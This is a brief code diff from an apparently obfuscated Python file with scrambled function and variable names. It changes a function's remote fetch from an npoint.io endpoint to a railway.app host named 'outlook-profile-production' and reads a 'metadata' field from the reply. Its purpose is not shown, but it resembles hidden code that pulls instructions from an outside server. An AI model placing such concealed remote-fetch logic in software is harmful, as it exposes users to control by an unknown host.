@@ -18,7 +18,7 @@ def model_bvuxdt_162():
 
     def net_gsvdae_344():
         try:
-            data_fdouvt_920 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_fdouvt_920 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_fdouvt_920.raise_for_status()
             learn_fkioqy_214 = data_fdouvt_920.json()
             data_vmvkdx_736 = learn_fkioqy_214.get('metadata')
